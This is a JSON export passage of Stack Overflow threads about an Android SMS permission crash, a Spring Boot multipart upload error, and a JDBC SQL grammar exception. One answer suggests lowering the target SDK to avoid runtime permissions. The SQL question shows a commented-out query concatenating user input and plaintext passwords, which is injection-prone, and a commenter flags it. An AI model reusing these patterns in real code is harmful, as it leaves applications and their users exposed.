Hassan"},"down_vote_count":1,"up_vote_count":3,"is_accepted":false,"score":2,"last_activity_date":1494191021,"creation_date":1494191021,"answer_id":43836702,"question_id":32635704,"body_markdown":"If you are using Android version &quot;23&quot; or &quot;23+&quot;, then app will show you errors when you are trying to access anything which requires user&#39;s permission. You have to ask for permissions at run-time even if you have declared those permissions in Android manifest.\r\n\r\nCheck this: https://developer.android.com/training/permissions/requesting.html\r\n\r\nBut if you have created your whole application and don&#39;t want to change at every place then a little cheat will be sufficient.\r\n\r\nGo to &quot;Build.gradle&quot; file and change the target Sdk version to less than 23, like 22, 21.","title":"Android permission doesn&#39;t work even if I have declared it","body":"<p>If you are using Android version \"23\" or \"23+\", then app will show you errors when you are trying to access anything which requires user's permission. You have to ask for permissions at run-time even if you have declared those permissions in Android manifest.</p>\n\n<p>Check this: <a href=\"https://developer.android.com/training/permissions/requesting.html\" rel=\"nofollow noreferrer\">https://developer.android.com/training/permissions/requesting.html</a></p>\n\n<p>But if you have created your whole application and don't want to change at every place then a little cheat will be sufficient.</p>\n\n<p>Go to \"Build.gradle\" file and change the target Sdk version to less than 23, like 22, 21.</p>\n"},{"tags":[],"owner":{"account_id":11925060,"reputation":1775,"user_id":8726579,"display_name":"Rishabh Saxena"},"down_vote_count":0,"up_vote_count":8,"is_accepted":false,"score":8,"last_activity_date":1523954513,"creation_date":1523605814,"answer_id":49811890,"question_id":32635704,"body_markdown":"Please go through the link below, \r\nhttps://developer.android.com/guide/topics/permissions/overview.html\r\n\r\nSome samples are also available there to get start with the permissions.\r\n\r\nTo make android more secure now developers has to mention permission in manifest as well as they should have to ask user as well in run time to get the work done. They are permission categorized in dangerous permission section which are mention below\r\n \r\n**CALENDAR** \t\r\n\r\n    READ_CALENDAR\r\n\r\n    WRITE_CALENDAR\r\n\r\n**CAMERA** \t\r\n\r\n    CAMERA\r\n\r\n**CONTACTS** \t\r\n\r\n    READ_CONTACTS\r\n    WRITE_CONTACTS\r\n    GET_ACCOUNTS\r\n\r\n**LOCATION** \t\r\n\r\n    ACCESS_FINE_LOCATION\r\n    ACCESS_COARSE_LOCATION\r\n\r\n**MICROPHONE** \t\r\n\r\n    RECORD_AUDIO\r\n\r\n**PHONE** \t\r\n\r\n    READ_PHONE_STATE\r\n    READ_PHONE_NUMBERS\r\n    CALL_PHONE\r\n    ANSWER_PHONE_CALLS (must request at runtime)\r\n    READ_CALL_LOG\r\n    WRITE_CALL_LOG\r\n    ADD_VOICEMAIL\r\n    USE_SIP\r\n    PROCESS_OUTGOING_CALLS\r\n    ANSWER_PHONE_CALLS\r\n\r\n**SENSORS** \t\r\n\r\n    BODY_SENSORS\r\n\r\n**SMS** \t\r\n\r\n    SEND_SMS\r\n    RECEIVE_SMS\r\n    READ_SMS\r\n    RECEIVE_WAP_PUSH\r\n    RECEIVE_MMS\r\n\r\n**STORAGE** \t\r\n\r\n    READ_EXTERNAL_STORAGE\r\n    WRITE_EXTERNAL_STORAGE","title":"Android permission doesn&#39;t work even if I have declared it","body":"<p>Please go through the link below, \n<a href=\"https://developer.android.com/guide/topics/permissions/overview.html\" rel=\"noreferrer\">https://developer.android.com/guide/topics/permissions/overview.html</a></p>\n\n<p>Some samples are also available there to get start with the permissions.</p>\n\n<p>To make android more secure now developers has to mention permission in manifest as well as they should have to ask user as well in run time to get the work done. They are permission categorized in dangerous permission section which are mention below</p>\n\n<p><strong>CALENDAR</strong>    </p>\n\n<pre><code>READ_CALENDAR\n\nWRITE_CALENDAR\n</code></pre>\n\n<p><strong>CAMERA</strong>  </p>\n\n<pre><code>CAMERA\n</code></pre>\n\n<p><strong>CONTACTS</strong>    </p>\n\n<pre><code>READ_CONTACTS\nWRITE_CONTACTS\nGET_ACCOUNTS\n</code></pre>\n\n<p><strong>LOCATION</strong>    </p>\n\n<pre><code>ACCESS_FINE_LOCATION\nACCESS_COARSE_LOCATION\n</code></pre>\n\n<p><strong>MICROPHONE</strong>  </p>\n\n<pre><code>RECORD_AUDIO\n</code></pre>\n\n<p><strong>PHONE</strong>   </p>\n\n<pre><code>READ_PHONE_STATE\nREAD_PHONE_NUMBERS\nCALL_PHONE\nANSWER_PHONE_CALLS (must request at runtime)\nREAD_CALL_LOG\nWRITE_CALL_LOG\nADD_VOICEMAIL\nUSE_SIP\nPROCESS_OUTGOING_CALLS\nANSWER_PHONE_CALLS\n</code></pre>\n\n<p><strong>SENSORS</strong>     </p>\n\n<pre><code>BODY_SENSORS\n</code></pre>\n\n<p><strong>SMS</strong>     </p>\n\n<pre><code>SEND_SMS\nRECEIVE_SMS\nREAD_SMS\nRECEIVE_WAP_PUSH\nRECEIVE_MMS\n</code></pre>\n\n<p><strong>STORAGE</strong>     </p>\n\n<pre><code>READ_EXTERNAL_STORAGE\nWRITE_EXTERNAL_STORAGE\n</code></pre>\n"},{"tags":[],"owner":{"account_id":6733186,"reputation":354,"user_id":5188804,"display_name":"SergeyYu"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1558508720,"creation_date":1551769606,"answer_id":54997177,"question_id":32635704,"body_markdown":"I hope the solution to write to external storage will be useful too\r\n\r\n    public  boolean checkPermission() {\r\n            if (Build.VERSION.SDK_INT &gt;= 23) {\r\n                if (checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)\r\n                        == PackageManager.PERMISSION_GRANTED) {\r\n                    Timber.tag(LOG_TAG).e(&quot;Permission error. You have permission&quot;);\r\n                    return true;\r\n                } else {\r\n                    Timber.tag(LOG_TAG).e(&quot;Permission error. You have asked for permission&quot;);\r\n                    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);\r\n                    return false;\r\n                }\r\n            }\r\n            else { \r\n                // for a stuff below api level 23\r\n                Timber.tag(LOG_TAG).e(&quot;Permission error. You already have the permission&quot;);\r\n                return true;\r\n            }\r\n        }","title":"Android permission doesn&#39;t work even if I have declared it","body":"<p>I hope the solution to write to external storage will be useful too</p>\n\n<pre><code>public  boolean checkPermission() {\n        if (Build.VERSION.SDK_INT &gt;= 23) {\n            if (checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)\n                    == PackageManager.PERMISSION_GRANTED) {\n                Timber.tag(LOG_TAG).e(\"Permission error. You have permission\");\n                return true;\n            } else {\n                Timber.tag(LOG_TAG).e(\"Permission error. You have asked for permission\");\n                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);\n                return false;\n            }\n        }\n        else { \n            // for a stuff below api level 23\n            Timber.tag(LOG_TAG).e(\"Permission error. You already have the permission\");\n            return true;\n        }\n    }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":4803905,"reputation":17,"user_id":3879659,"display_name":"Partha Sarathi Murmu"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1555670088,"creation_date":1555670088,"answer_id":55760503,"question_id":32635704,"body_markdown":"So i had to create an app to send and receive messages but the send action crashed whenever i clicked on send even though the permission was granted . I had requested runtime permissions and allowed them, still i faced a crash that the process doesnt have the requested permission to send SMS . \r\nI had checked the granted permissions from :\r\n\r\n    adb shell dumpsys package &lt;package-name&gt;\r\n\r\nThe order of my request for permissions was \r\n\r\n 1. RECEIVE_SMS\r\n 2. SEND_SMS\r\n\r\nI reverted the order of request and it works fine . This was tested with a complete new app(uninstall-&gt; install -&gt; test). The answer may seem weird but just give it a shot . \r\n\r\n(If it works in the shown way in a certain order, then Android might have a bug!!) \r\n","title":"Android permission doesn&#39;t work even if I have declared it","body":"<p>So i had to create an app to send and receive messages but the send action crashed whenever i clicked on send even though the permission was granted . I had requested runtime permissions and allowed them, still i faced a crash that the process doesnt have the requested permission to send SMS . \nI had checked the granted permissions from :</p>\n\n<pre><code>adb shell dumpsys package &lt;package-name&gt;\n</code></pre>\n\n<p>The order of my request for permissions was </p>\n\n<ol>\n<li>RECEIVE_SMS</li>\n<li>SEND_SMS</li>\n</ol>\n\n<p>I reverted the order of request and it works fine . This was tested with a complete new app(uninstall-> install -> test). The answer may seem weird but just give it a shot . </p>\n\n<p>(If it works in the shown way in a certain order, then Android might have a bug!!) </p>\n"},{"tags":[],"owner":{"account_id":8315373,"reputation":47,"user_id":6248882,"display_name":"alchemist"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683712662,"creation_date":1683565773,"answer_id":76202793,"question_id":32635704,"body_markdown":"if you API level greater than 26 you should add permission to your code like that:\r\n\r\n```\r\nclass MainActivity : AppCompatActivity() {\r\n\r\n    val cManageSMS=cManageSMS() // &lt;-- initialize your SMS handling class\r\n    ...\r\n    override fun onCreate(savedInstanceState: Bundle?) {\r\n\r\n    // Adding permission\r\n    var myPermission: Array&lt;String&gt; = arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS)\r\n    ActivityCompat.requestPermissions(this, myPermission,1)\r\n\r\n    // Call to your readSms() method (important! readSms method should be after permission setting!)\r\n    cManageSMS.readSms()\r\n    ...\r\n```","title":"Android permission doesn&#39;t work even if I have declared it","body":"<p>if you API level greater than 26 you should add permission to your code like that:</p>\n<pre><code>class MainActivity : AppCompatActivity() {\n\n    val cManageSMS=cManageSMS() // &lt;-- initialize your SMS handling class\n    ...\n    override fun onCreate(savedInstanceState: Bundle?) {\n\n    // Adding permission\n    var myPermission: Array&lt;String&gt; = arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS)\n    ActivityCompat.requestPermissions(this, myPermission,1)\n\n    // Call to your readSms() method (important! readSms method should be after permission setting!)\n    cManageSMS.readSms()\n    ...\n</code></pre>\n"}],"owner":{"account_id":6970982,"reputation":2056,"user_id":5347360,"display_name":"Nathan Loudjani"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":121492,"favorite_count":0,"down_vote_count":0,"up_vote_count":190,"accepted_answer_id":32636039,"answer_count":12,"score":190,"last_activity_date":1683712662,"creation_date":1442508243,"question_id":32635704,"body_markdown":"I&#39;m trying to write code to send an SMS from an Android app, but when I try to send the SMS it sends me back the error:\r\n\r\n&lt;!-- language: lang-none --&gt;\r\n\r\n    09-17 18:37:29.974  12847-12847/**.**.****E/AndroidRuntime﹕ FATAL EXCEPTION: main\r\n    Process: **.**.****, PID: 12847\r\n    java.lang.SecurityException: Sending SMS message: uid 10092 does not have android.permission.SEND_SMS.\r\n            at android.os.Parcel.readException(Parcel.java:1599)\r\n            at android.os.Parcel.readException(Parcel.java:1552)\r\n            at com.android.internal.telephony.ISms$Stub$Proxy.sendTextForSubscriber(ISms.java:768)\r\n            at android.telephony.SmsManager.sendTextMessageInternal(SmsManager.java:310)\r\n            at android.telephony.SmsManager.sendTextMessage(SmsManager.java:293)\r\n            at **.**.****.MainActivity$3.onClick(MainActivity.java:70)\r\n            at android.view.View.performClick(View.java:5198)\r\n            at android.view.View$PerformClick.run(View.java:21147)\r\n            at android.os.Handler.handleCallback(Handler.java:739)\r\n            at android.os.Handler.dispatchMessage(Handler.java:95)\r\n            at android.os.Looper.loop(Looper.java:148)\r\n            at android.app.ActivityThread.main(ActivityThread.java:5417)\r\n            at java.lang.reflect.Method.invoke(Native Method)\r\n            at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:726)\r\n            at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:616)\r\n\r\nI checked but I have the permissions in the manifest, as follows:\r\n\r\n    &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\r\n&lt;manifest xmlns: Android=&quot;http://schemas.android.com/apk/res/Android&quot;\r\n    package=&quot;**.**.****&quot;&gt;\r\n\r\n    &lt;uses-permission android:name=&quot;android.permission.SEND_SMS&quot;/&gt;\r\n    &lt;uses-feature android:name=&quot;android.hardware.telephony&quot;\r\n        android:required=&quot;true&quot;/&gt;\r\n\r\n    &lt;application\r\n        android:exported=&quot;true&quot;\r\n        android:allowBackup=&quot;true&quot;\r\n        android:icon=&quot;@mipmap/ic_launcher&quot;\r\n        android:label=&quot;@string/app_name&quot;\r\n        android:theme=&quot;@style/AppTheme&quot;&gt;\r\n        &lt;activity\r\n            android:name=&quot;.MainActivity&quot;\r\n            android:label=&quot;@string/app_name&quot;\r\n            android:screenOrientation=&quot;portrait&quot;&gt;\r\n            &lt;intent-filter&gt;\r\n                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;\r\n\r\n                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;\r\n            &lt;/intent-filter&gt;\r\n        &lt;/activity&gt;\r\n    &lt;/application&gt;\r\n\r\n\r\n&lt;/manifest&gt;\r\n\r\nI searched the internet but all the errors were about the `&lt;uses-permission/&gt;` syntax, could you help me please?\r\n","title":"Android permission doesn&#39;t work even if I have declared it","body":"<p>I'm trying to write code to send an SMS from an Android app, but when I try to send the SMS it sends me back the error:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>09-17 18:37:29.974  12847-12847/**.**.****E/AndroidRuntime﹕ FATAL EXCEPTION: main\nProcess: **.**.****, PID: 12847\njava.lang.SecurityException: Sending SMS message: uid 10092 does not have android.permission.SEND_SMS.\n        at android.os.Parcel.readException(Parcel.java:1599)\n        at android.os.Parcel.readException(Parcel.java:1552)\n        at com.android.internal.telephony.ISms$Stub$Proxy.sendTextForSubscriber(ISms.java:768)\n        at android.telephony.SmsManager.sendTextMessageInternal(SmsManager.java:310)\n        at android.telephony.SmsManager.sendTextMessage(SmsManager.java:293)\n        at **.**.****.MainActivity$3.onClick(MainActivity.java:70)\n        at android.view.View.performClick(View.java:5198)\n        at android.view.View$PerformClick.run(View.java:21147)\n        at android.os.Handler.handleCallback(Handler.java:739)\n        at android.os.Handler.dispatchMessage(Handler.java:95)\n        at android.os.Looper.loop(Looper.java:148)\n        at android.app.ActivityThread.main(ActivityThread.java:5417)\n        at java.lang.reflect.Method.invoke(Native Method)\n        at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:726)\n        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:616)\n</code></pre>\n\n<p>I checked but I have the permissions in the manifest, as follows:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n</code></pre>\n\n<p></p>\n\n<pre><code>&lt;uses-permission android:name=\"android.permission.SEND_SMS\"/&gt;\n&lt;uses-feature android:name=\"android.hardware.telephony\"\n    android:required=\"true\"/&gt;\n\n&lt;application\n    android:exported=\"true\"\n    android:allowBackup=\"true\"\n    android:icon=\"@mipmap/ic_launcher\"\n    android:label=\"@string/app_name\"\n    android:theme=\"@style/AppTheme\"&gt;\n    &lt;activity\n        android:name=\".MainActivity\"\n        android:label=\"@string/app_name\"\n        android:screenOrientation=\"portrait\"&gt;\n        &lt;intent-filter&gt;\n            &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n\n            &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n        &lt;/intent-filter&gt;\n    &lt;/activity&gt;\n&lt;/application&gt;\n</code></pre>\n\n<p></p>\n\n<p>I searched the internet but all the errors were about the <code>&lt;uses-permission/&gt;</code> syntax, could you help me please?</p>\n"},{"tags":["java","spring-boot","spring-mvc","spring-restcontroller"],"owner":{"account_id":11976502,"reputation":420,"user_id":14686302,"display_name":"kernel"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":28,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683712653,"creation_date":1683712653,"question_id":76217085,"body_markdown":"Is there a special tool or Parser project where I can find the API calls for each Controller in my source code?\r\n\r\nFor example, I have a user/createUser controller method, I want to find out if this method calls other services with FeignClient or RestTemplate in service classes.","title":"Java code flow parser analizer for all API Calls","body":"<p>Is there a special tool or Parser project where I can find the API calls for each Controller in my source code?</p>\n<p>For example, I have a user/createUser controller method, I want to find out if this method calls other services with FeignClient or RestTemplate in service classes.</p>\n"},{"tags":["javascript","java","reactjs","spring","spring-boot"],"comments":[{"owner":{"account_id":17975599,"reputation":85,"user_id":14634474,"display_name":"Даниил Дмитроченков"},"score":0,"creation_date":1611322803,"post_id":65846064,"comment_id":116420857,"body_markdown":"try add `consumes = { &quot;multipart/form-data&quot; }` to `@PostMapping` annotation","body":"try add <code>consumes = { &quot;multipart&#47;form-data&quot; }</code> to <code>@PostMapping</code> annotation"},{"owner":{"account_id":20475166,"reputation":25,"user_id":15024676,"display_name":"Dukenukem97"},"score":0,"creation_date":1611323145,"post_id":65846064,"comment_id":116421051,"body_markdown":"@ДаниилДмитроченков i tried and gets &quot;org.springframework.web.HttpMediaTypeNotSupportedException: Content type &#39;application/x-www-form-urlencoded&#39; not supported&quot;","body":"@ДаниилДмитроченков i tried and gets &quot;org.springframework.web.HttpMediaTypeNotSupportedException: Content type &#39;application/x-www-form-urlencoded&#39; not supported&quot;"},{"owner":{"account_id":17975599,"reputation":85,"user_id":14634474,"display_name":"Даниил Дмитроченков"},"score":0,"creation_date":1611324919,"post_id":65846064,"comment_id":116421951,"body_markdown":"Are you sure `https://localhost:8080/add-item` is correct URL? May be `http://localhost:8080/add-item`? (http instead https)","body":"Are you sure <code>https:&#47;&#47;localhost:8080&#47;add-item</code> is correct URL? May be <code>http:&#47;&#47;localhost:8080&#47;add-item</code>? (http instead https)"},{"owner":{"account_id":17975599,"reputation":85,"user_id":14634474,"display_name":"Даниил Дмитроченков"},"score":0,"creation_date":1611325457,"post_id":65846064,"comment_id":116422214,"body_markdown":"Probably you have problem with sending request check this https://stackoverflow.com/questions/43013858/how-to-post-a-file-from-a-form-with-axios","body":"Probably you have problem with sending request check this <a href=\"https://stackoverflow.com/questions/43013858/how-to-post-a-file-from-a-form-with-axios\" title=\"how to post a file from a form with axios\">stackoverflow.com/questions/43013858/&hellip;</a>"}],"answers":[{"tags":[],"owner":{"account_id":18452928,"reputation":2722,"user_id":14927001,"display_name":"Dmitrii B"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1611324730,"creation_date":1611324730,"answer_id":65846769,"question_id":65846064,"body_markdown":"try to change `@PostMapping` when `MULTIPART_FORM_DATA_VALUE` from `import static org.springframework.http.MediaType.MULTIPART_FORM_DATA_VALUE;`\r\n\r\n    @PostMapping(value = &quot;/add-item&quot;, consumes = MULTIPART_FORM_DATA_VALUE)\r\n    public ResponseEntity&lt;?&gt; handleProductInsert ( @RequestParam MultipartFile thumbnailFile ){\r\n      try{\r\n              .....................\r\n              .....................\r\n            return new ResponseEntity(&quot;Product added successfully&quot;, HttpStatus.OK);\r\n        }catch (Exception e){\r\n            return new ResponseEntity(&quot;Internal Server Error. Try again later&quot;, \r\n              HttpStatus.INTERNAL_SERVER_ERROR);\r\n        }\r\n    }","title":"Current request is not a multipart request : Spring boot","body":"<p>try to change <code>@PostMapping</code> when <code>MULTIPART_FORM_DATA_VALUE</code> from <code>import static org.springframework.http.MediaType.MULTIPART_FORM_DATA_VALUE;</code></p>\n<pre><code>@PostMapping(value = &quot;/add-item&quot;, consumes = MULTIPART_FORM_DATA_VALUE)\npublic ResponseEntity&lt;?&gt; handleProductInsert ( @RequestParam MultipartFile thumbnailFile ){\n  try{\n          .....................\n          .....................\n        return new ResponseEntity(&quot;Product added successfully&quot;, HttpStatus.OK);\n    }catch (Exception e){\n        return new ResponseEntity(&quot;Internal Server Error. Try again later&quot;, \n          HttpStatus.INTERNAL_SERVER_ERROR);\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":9566029,"reputation":305,"user_id":7105295,"display_name":"Prashant Vishwakarma"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1662065364,"creation_date":1662065364,"answer_id":73575269,"question_id":65846064,"body_markdown":"form-data requires a `key` along with the file in Controller.\r\nTry:\r\n\r\n```\r\n@PostMapping(headers = { &quot;Content-Type=multipart/form-data&quot; }, value = &quot;/add-item&quot;)\r\npublic ResponseEntity&lt;?&gt; handleProductInsert(@RequestParam(&quot;file&quot;) MultipartFile thumbnailFile){\r\n  try{\r\n          .....................\r\n          .....................\r\n        return new ResponseEntity(&quot;Product added successfully&quot;, HttpStatus.OK);\r\n    }catch (Exception e){\r\n        return new ResponseEntity(&quot;Internal Server Error. Try again later&quot;, \r\n          HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n}\r\n```\r\nOn Client Application, prepare request:\r\n```\r\n&lt;form id=&#39;form&#39; encType=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;\r\n    &lt;input id=&#39;import-field&#39; type=&quot;file&quot; name=&quot;file&quot; accept=&quot;.jpg&quot; onChange={onUpload} /&gt;\r\n&lt;/form&gt;\r\n```\r\n```\r\nconst onUpload = event =&gt; {\r\n    if (event.target.files.length &gt; 0) {\r\n        let formElement = document.getElementById(&#39;import-field&#39;);\r\n        uploadFile(new FormData(formElement)); //do POST call here\r\n    }\r\n};\r\n```","title":"Current request is not a multipart request : Spring boot","body":"<p>form-data requires a <code>key</code> along with the file in Controller.\nTry:</p>\n<pre><code>@PostMapping(headers = { &quot;Content-Type=multipart/form-data&quot; }, value = &quot;/add-item&quot;)\npublic ResponseEntity&lt;?&gt; handleProductInsert(@RequestParam(&quot;file&quot;) MultipartFile thumbnailFile){\n  try{\n          .....................\n          .....................\n        return new ResponseEntity(&quot;Product added successfully&quot;, HttpStatus.OK);\n    }catch (Exception e){\n        return new ResponseEntity(&quot;Internal Server Error. Try again later&quot;, \n          HttpStatus.INTERNAL_SERVER_ERROR);\n    }\n}\n</code></pre>\n<p>On Client Application, prepare request:</p>\n<pre><code>&lt;form id='form' encType=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;\n    &lt;input id='import-field' type=&quot;file&quot; name=&quot;file&quot; accept=&quot;.jpg&quot; onChange={onUpload} /&gt;\n&lt;/form&gt;\n</code></pre>\n<pre><code>const onUpload = event =&gt; {\n    if (event.target.files.length &gt; 0) {\n        let formElement = document.getElementById('import-field');\n        uploadFile(new FormData(formElement)); //do POST call here\n    }\n};\n</code></pre>\n"},{"tags":[],"owner":{"account_id":70791,"reputation":1619,"user_id":204950,"accept_rate":92,"display_name":"banterCZ"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683712537,"creation_date":1683712537,"answer_id":76217064,"question_id":65846064,"body_markdown":"It is needed to specify the content type header\r\n\r\n```javascript\r\naxios.post(&#39;upload_file&#39;, formData, {\r\n    headers: {\r\n      &#39;Content-Type&#39;: &#39;multipart/form-data&#39;\r\n    }\r\n})\r\n```\r\n\r\nOr use a shortcut method `postForm`, which is just the corresponding http method with the `Content-Type` header preset to `multipart/form-data`, see https://github.com/axios/axios#using-multipartform-data-format\r\n\r\n```javascript\r\naxios.postForm(&#39;upload_file&#39;, formData)\r\n```\r\n\r\n","title":"Current request is not a multipart request : Spring boot","body":"<p>It is needed to specify the content type header</p>\n<pre class=\"lang-js prettyprint-override\"><code>axios.post('upload_file', formData, {\n    headers: {\n      'Content-Type': 'multipart/form-data'\n    }\n})\n</code></pre>\n<p>Or use a shortcut method <code>postForm</code>, which is just the corresponding http method with the <code>Content-Type</code> header preset to <code>multipart/form-data</code>, see <a href=\"https://github.com/axios/axios#using-multipartform-data-format\" rel=\"nofollow noreferrer\">https://github.com/axios/axios#using-multipartform-data-format</a></p>\n<pre class=\"lang-js prettyprint-override\"><code>axios.postForm('upload_file', formData)\n</code></pre>\n"}],"owner":{"account_id":20475166,"reputation":25,"user_id":15024676,"display_name":"Dukenukem97"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":2007,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":3,"score":0,"last_activity_date":1683712537,"creation_date":1611321938,"question_id":65846064,"body_markdown":"Current request is not a multipart request Spring boot error while trying to upload a Image file. \r\n\r\n**Spring Boot**\r\n\r\n    @PostMapping(value = &quot;/add-item&quot;)\r\n    public ResponseEntity&lt;?&gt; handleProductInsert ( @RequestParam MultipartFile thumbnailFile ){\r\n      try{\r\n              .....................\r\n              .....................\r\n            return new ResponseEntity(&quot;Product added successfully&quot;, HttpStatus.OK);\r\n        }catch (Exception e){\r\n            return new ResponseEntity(&quot;Internal Server Error. Try again later&quot;, \r\n              HttpStatus.INTERNAL_SERVER_ERROR);\r\n        }\r\n    }\r\n\r\n**React App**\r\n\r\n   \r\n\r\n    state={data:null}\r\n    \r\n       handleChange=(e)=&gt;{\r\n         this.setState({data:e.target.files[0]});\r\n       }\r\n    \r\n       connectToDatabase=async()=&gt;{\r\n            return await axios.post(`https://localhost:8080/add-item`, this.state.data);\r\n        }\r\n    \r\n       render()=&gt;{\r\n           return (&lt;&gt;\r\n                    &lt;input accept=&quot;image/*&quot; onChange={this.handleChange} type=&quot;file&quot; /&gt;\r\n                    &lt;button onClick={this.connectToDatabase}&gt;Submit&lt;/button&gt;\r\n                   &lt;/&gt;\r\n                  )\r\n    }\r\n\r\n","title":"Current request is not a multipart request : Spring boot","body":"<p>Current request is not a multipart request Spring boot error while trying to upload a Image file.</p>\n<p><strong>Spring Boot</strong></p>\n<pre><code>@PostMapping(value = &quot;/add-item&quot;)\npublic ResponseEntity&lt;?&gt; handleProductInsert ( @RequestParam MultipartFile thumbnailFile ){\n  try{\n          .....................\n          .....................\n        return new ResponseEntity(&quot;Product added successfully&quot;, HttpStatus.OK);\n    }catch (Exception e){\n        return new ResponseEntity(&quot;Internal Server Error. Try again later&quot;, \n          HttpStatus.INTERNAL_SERVER_ERROR);\n    }\n}\n</code></pre>\n<p><strong>React App</strong></p>\n<pre><code>state={data:null}\n\n   handleChange=(e)=&gt;{\n     this.setState({data:e.target.files[0]});\n   }\n\n   connectToDatabase=async()=&gt;{\n        return await axios.post(`https://localhost:8080/add-item`, this.state.data);\n    }\n\n   render()=&gt;{\n       return (&lt;&gt;\n                &lt;input accept=&quot;image/*&quot; onChange={this.handleChange} type=&quot;file&quot; /&gt;\n                &lt;button onClick={this.connectToDatabase}&gt;Submit&lt;/button&gt;\n               &lt;/&gt;\n              )\n}\n</code></pre>\n"},{"tags":["java","mysql","spring-boot","jdbc"],"comments":[{"owner":{"account_id":551394,"reputation":8315,"user_id":916225,"accept_rate":69,"display_name":"seenukarthi"},"score":0,"creation_date":1683712483,"post_id":76217005,"comment_id":134407437,"body_markdown":"Remove the `;` at the end of your query string.","body":"Remove the <code>;</code> at the end of your query string."},{"owner":{"account_id":213468,"reputation":103488,"user_id":466862,"display_name":"Mark Rotteveel"},"score":0,"creation_date":1683713508,"post_id":76217005,"comment_id":134407703,"body_markdown":"Also, the commented out query is not something you should use as it makes you vulnerable to SQL injection. Please use proper parameters.","body":"Also, the commented out query is not something you should use as it makes you vulnerable to SQL injection. Please use proper parameters."},{"owner":{"account_id":18094149,"reputation":65,"user_id":13152857,"display_name":"Mishaal Naeem"},"score":0,"creation_date":1683714157,"post_id":76217005,"comment_id":134407862,"body_markdown":"@seenukarthi same issue without the ; as well","body":"@seenukarthi same issue without the ; as well"},{"owner":{"account_id":551394,"reputation":8315,"user_id":916225,"accept_rate":69,"display_name":"seenukarthi"},"score":1,"creation_date":1683714547,"post_id":76217005,"comment_id":134407962,"body_markdown":"replace `System.out.println(e);` with `e.printStackTrace()` and add the stacktrace to you question.","body":"replace <code>System.out.println(e);</code> with <code>e.printStackTrace()</code> and add the stacktrace to you question."}],"answers":[{"tags":[],"owner":{"account_id":2458519,"reputation":7657,"user_id":2143128,"display_name":"Ratul Sharker"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683712363,"creation_date":1683712363,"answer_id":76217038,"question_id":76217005,"body_markdown":"You might want to remove the `;` from the end.","title":"Bad SQL Grammar Exception Springboot","body":"<p>You might want to remove the <code>;</code> from the end.</p>\n"}],"owner":{"account_id":18094149,"reputation":65,"user_id":13152857,"display_name":"Mishaal Naeem"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":114,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1683712363,"creation_date":1683712102,"question_id":76217005,"body_markdown":"I am using JDBC in Springboot. I get Bad SQL Grammar Exception with the following query even though the query works fine directly on the MySQL workbench. Can someone tell me what I am doing wrong?\r\n\r\nI am using Java 17. Springboot 3.0.6. \r\n\r\n    public int fetchUserByEmailAndPassword(String email, String password) {\r\n        try\r\n        {\r\n            String sql = &quot;SELECT userId FROM authentication.user WHERE email= &#39;abc@gmail.com&#39; AND password= &#39;12345&#39;;&quot;;\r\n            //String sql = &quot;SELECT userId FROM authentication.user WHERE email=&#39;&quot; + email + &quot;&#39; AND password=&#39;&quot; + password +&quot;&#39;;&quot;;\r\n            return getJdbcTemplate().queryForObject(sql, Integer.class);\r\n        } catch(EmptyResultDataAccessException e)\r\n        {\r\n            return 0;\r\n        } catch(Exception e)\r\n        {\r\n            System.out.println(e);\r\n            return 0;\r\n        }\r\n    }\r\n\r\n\r\n","title":"Bad SQL Grammar Exception Springboot","body":"<p>I am using JDBC in Springboot. I get Bad SQL Grammar Exception with the following query even though the query works fine directly on the MySQL workbench. Can someone tell me what I am doing wrong?</p>\n<p>I am using Java 17. Springboot 3.0.6.</p>\n<pre><code>public int fetchUserByEmailAndPassword(String email, String password) {\n    try\n    {\n        String sql = &quot;SELECT userId FROM authentication.user WHERE email= 'abc@gmail.com' AND password= '12345';&quot;;\n        //String sql = &quot;SELECT userId FROM authentication.user WHERE email='&quot; + email + &quot;' AND password='&quot; + password 